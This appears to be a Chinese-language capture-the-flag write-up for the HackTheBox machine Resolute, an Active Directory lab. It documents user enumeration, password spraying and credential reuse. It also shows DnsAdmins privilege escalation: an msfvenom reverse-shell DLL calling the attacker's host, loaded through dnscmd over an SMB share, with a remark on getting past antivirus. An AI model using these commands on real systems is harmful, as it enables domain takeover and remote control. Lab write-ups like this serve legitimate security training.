# README

## 信息收集

### nmap

```shell
sudo nmap -p- --min-rate 10000 10.10.10.169
Password:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-15 20:23 CST
Nmap scan report for loaclhost (10.10.10.169)
Host is up (0.58s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49684/tcp open  unknown
49699/tcp open  unknown
49716/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.71 seconds
```



```shell
sudo nmap -p 88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV  10.10.10.169
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-15 20:25 CST
Nmap scan report for loaclhost (10.10.10.169)
Host is up (0.46s latency).

PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-15 12:32:22Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-09-15T12:32:54
|_  start_date: 2023-09-15T12:29:08
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2023-09-15T05:32:56-07:00
|_clock-skew: mean: 2h27m00s, deviation: 4h02m31s, median: 6m58s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.72 seconds

```

域名为megabank.local



### 135端口

```shell
rpcclient -U "" -N 10.10.10.169
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```

处理一下得到：

```shell
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```



看一下desc：

```shell
rpcclient $> querydispinfo
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: (null)	Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela	Name: (null)	Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette	Name: (null)	Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika	Name: (null)	Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire	Name: (null)	Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude	Name: (null)	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia	Name: (null)	Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred	Name: (null)	Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo	Name: (null)	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus	Name: (null)	Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie	Name: (null)	Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki	Name: (null)	Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo	Name: (null)	Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per	Name: (null)	Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan	Name: Ryan Bertrand	Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally	Name: (null)	Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon	Name: (null)	Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve	Name: (null)	Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie	Name: (null)	Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita	Name: (null)	Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf	Name: (null)	Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)
```



得到了marko的密码Welcome123!，但是evil-winrm登不上去。

### 389端口

```shell
ldapsearch -x -b "DC=megabank,DC=local"  -s base -h 10.10.10.169
# extended LDIF
#
# LDAPv3
# base <DC=megabank,DC=local> with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

# megabank.local
dn: DC=megabank,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=megabank,DC=local
instanceType: 5
whenCreated: 20190925132822.0Z
whenChanged: 20230915122858.0Z
subRefs: DC=ForestDnsZones,DC=megabank,DC=local
subRefs: DC=DomainDnsZones,DC=megabank,DC=local
subRefs: CN=Configuration,DC=megabank,DC=local
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAI0kCuedEgkuD1X4NGZryvA==
uSNChanged: 151597
name: megabank
objectGUID:: RungtOfLt0KPoFxM7C/lqg==
replUpToDateVector:: AgAAAAAAAAAWAAAAAAAAADv+xw5NT59AgbZ+xJHTUowawAEAAAAAAAxz9
 xMDAAAAwh0pHcgb2UeivFJL4Q8QZAigAAAAAAAAETWfEwMAAABwEWNEnJ/JTqZrXDzeu6t8HOABAA
 AAAABGe/cTAwAAAKo4iGFkQ2tNttYznkdNa8gHkAAAAAAAAFownxMDAAAABaKyYvsphkGwNf2+l/T
 OcQmwAAAAAAAA0DefEwMAAABgnQ5ls1S9RbRniAcF/EnhBXAAAAAAAAA8IJ8TAwAAANkKY2p5o8JJ
 iWThb22GsFkfEAIAAAAAAPEu+BMDAAAANjjJgh690k6SHEyv8j3GbwzgAAAAAAAAQB/mEwMAAAARO
 oWDI5jaSqqD5vcle3fBGKABAAAAAAAKafcTAwAAANC7S4v1tdVEvvnXks56Pzsb0AEAAAAAAHZ39x
 MDAAAAClc6jW+1nEe6iH9KjbQfHxVwAQAAAAAALiT3EwMAAADYJfudVPvpSK11CCwhkf7sBoAAAAA
 AAADpLJ8TAwAAACXlzaE+3D1MqNP2Y3JBf0UiQAIAAAAAAFSG0hcDAAAAJUHBtbdSj0G3p/mpteQC
 MiNQAgAAAAAACd8UGwMAAAAjSQK550SCS4PVfg0ZmvK8A1AAAAAAAAARCJ8TAwAAAGihnMtrf2pMi
 EYNFOaQ8tsN8AAAAAAAADrv9hMDAAAAZCIS0nOJO02thQFI7blYVh3wAQAAAAAACX33EwMAAACkTz
 7Zm6uWQ6l9IIrElbWGITACAAAAAAAqU/gTAwAAACKgoeQ+rWhIgY1lWoEJguYEYAAAAAAAAF0UnxM
 DAAAAu4zE5p0Bg0mBNo4LXGAgtRmwAQAAAAAADW73EwMAAAAlfTr34PbvTbLi3YAu8CqzF5ABAAAA
 AAC7YPcTAwAAAPkwwP+dZrZLkzlXUoHFUKYeAAIAAAAAAAcd+BMDAAAA
creationTime: 133392545385445597
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 0
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAAaeAGU04VmrOsCGHW
serverState: 1
uASCompat: 1
modifiedCount: 1
auditingPolicy:: AAE=
nTMixedDomain: 0
rIDManagerReference: CN=RID Manager$,CN=System,DC=megabank,DC=local
fSMORoleOwner: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=megabank,DC=local
systemFlags: -1946157056
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=mega
 bank,DC=local
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=megabank,DC=local
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=meg
 abank,DC=local
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=megabank,DC=local
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 megabank,DC=local
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=m
 egabank,DC=local
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=meg
 abank,DC=local
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=megabank,
 DC=local
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=megabank,DC=local
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=megaba
 nk,DC=local
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=megabank,D
 C=local
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=megabank,DC=local
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=megabank,DC=local;0]
dSCorePropagationData: 16010101000000.0Z
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=megaba
 nk,DC=local
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
 e Accounts,DC=megabank,DC=local
masteredBy: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name
 ,CN=Sites,CN=Configuration,DC=megabank,DC=local
ms-DS-MachineAccountQuota: 10
msDS-Behavior-Version: 7
msDS-PerUserTrustQuota: 1
msDS-AllUsersTrustQuota: 1000
msDS-PerUserTrustTombstonesQuota: 10
msDs-masteredBy: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site
 -Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
msDS-IsDomainFor: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Sit
 e-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
msDS-NcType: 0
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
dc: megabank

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```



### 445端口

```shell
smbmap -H 10.10.10.169 -u guest

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 0 hosts serving SMB

feng at fengs-MacBook-Pro.local in [~/ctftools/impacket-0.11.0/examples]
20:32:14 › smbclient -N -L //10.10.10.169/
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

```



### 88端口

得到了一系列的用户名，猜测进行密码喷洒攻击：

```shell
./kerbrute_darwin_amd64 passwordspray --dc 10.10.10.169 -d megabank.local user.txt 'Welcome123!'
```

但是都没有成功，可能是因为对kerberos协议导致的，换smb协议ok：

```shell
crackmapexec smb 10.10.10.169 -u user.txt -p 'Welcome123!' --continue-on-success

SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

melanie用户可以成功登上evil-winrm：

```shell
*Evil-WinRM* PS C:\Users\melanie\Documents> whoami
megabank\melanie
```

## melanie用户

看一下基本信息：

```shell
*Evil-WinRM* PS C:\Users\ryan> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\ryan> net user melanie /domain
User name                    melanie
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/15/2023 7:39:03 PM
Password expires             Never
Password changeable          9/16/2023 7:39:03 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

是一个很低权限的用户。

查一下Users目录，下面还有一个ryna用户：

```shell
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019  10:43 AM                Administrator
d-----        12/4/2019   2:46 AM                melanie
d-r---       11/20/2016   6:39 PM                Public
d-----        9/27/2019   7:05 AM                ryan
```



检查smb：

```shell
smb: \megabank.local\> lcd /Users/feng/github/CTF/Web/渗透/hackthebox/Resolute
smb: \megabank.local\> RECURSE ON
smb: \megabank.local\> PROMPT OFF
smb: \megabank.local\> mget *
NT_STATUS_ACCESS_DENIED listing \megabank.local\DfsrPrivate\*
getting file \megabank.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 22 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \megabank.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \megabank.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (0.7 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \megabank.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3740 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \megabank.local\>
```

也没有什么东西。



看wp，去找文件系统，有点逆天。通过dir -force来列隐藏文件和文件夹，找到了：

```shell
*Evil-WinRM* PS C:\PSTranscripts\20191203> ls -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt


```

从里面读到了ryan的用户名密码：ryan:Serv3r4Admin4cc123!

## ryan用户

evil-winrm登上去后，查看桌面上的note.txt：

```shell
*Evil-WinRM* PS C:\Users\ryan\Desktop> type note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

查看一下用户信息，发现是DNSADmin组：

```shell
whoami /all
```

因此进行dnsadmin组的提权。这里有一个坑，就是evil-winrm上传的.dll一直是失败的：

```shell
*Evil-WinRM* PS C:\Users\ryan\Documents> dir


    Directory: C:\Users\ryan\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/15/2023  11:08 PM              0 da.dll
-a----        9/15/2023  11:24 PM              0 msfs.dll
-a----        9/15/2023  11:43 PM              0 msfshell.dll
-a----        9/15/2023  11:41 PM           7446 payload.txt
-a----        9/15/2023  11:40 PM              0 shell-reverse-39502.dll
-a----        9/15/2023  11:07 PM              0 test.dll
```

发现长度都为0，所以才一直失败，因此只能用smbserver。

```shell
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=39502 -f dll > shell-reverse-39502.dll
```

```shell
sudo smbserver.py share ./ -ip 10.10.14.14
```

```shell
dnscmd  /config /serverlevelplugindll \\10.10.14.14\share\shell-reverse-39502.dll
sc.exe stop dns
sc.exe start dns
```

即可获得反弹的shell：

```shell
 nc -lv 39502
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
5c83cbd4ef8792f7916833a65446624e

```

至于为什么传不上去，不知道，感觉很奇怪。



看了几篇文章，猜测可能是有杀软：

```shell
systeminfo

Host Name:                 RESOLUTE
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00376-30821-30176-AA312
Original Install Date:     9/25/2019, 10:17:51 AM
System Boot Time:          9/15/2023, 11:05:51 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume3
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 999 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 1,469 MB
Virtual Memory: In Use:    962 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    megabank.local
Logon Server:              N/A
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB4512574
                           [03]: KB4520724
                           [04]: KB4525236
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.169
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

看了一下确实是有Windows Defender：

```shell
*Evil-WinRM* PS C:\Users\ryan\Documents> dir "C:\ProgramData\Microsoft\"


    Directory: C:\ProgramData\Microsoft


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019   6:34 AM                Crypto
d-----        7/16/2016   6:18 AM                Device Stage
d---s-        9/25/2019  10:17 AM                Diagnosis
d-----        7/16/2016   6:18 AM                DRM
d-----        7/16/2016   6:18 AM                Event Viewer
d-----        7/16/2016   6:18 AM                NetFramework
d-----        7/16/2016   6:18 AM                Network
d-----        7/16/2016   6:18 AM                servermanager
d-----        7/16/2016   6:18 AM                Vault
d-----        7/16/2016   6:18 AM                WDF
d-----       11/20/2016   6:43 PM                Windows
d-----        12/4/2019   3:52 AM                Windows Defender
d-----        7/16/2016   6:18 AM                WinMSIPC


```

所以用smb的原因似乎是Antivirus（杀软） don't scan arrivals via SMB。

免杀以后看，太难了呜呜呜。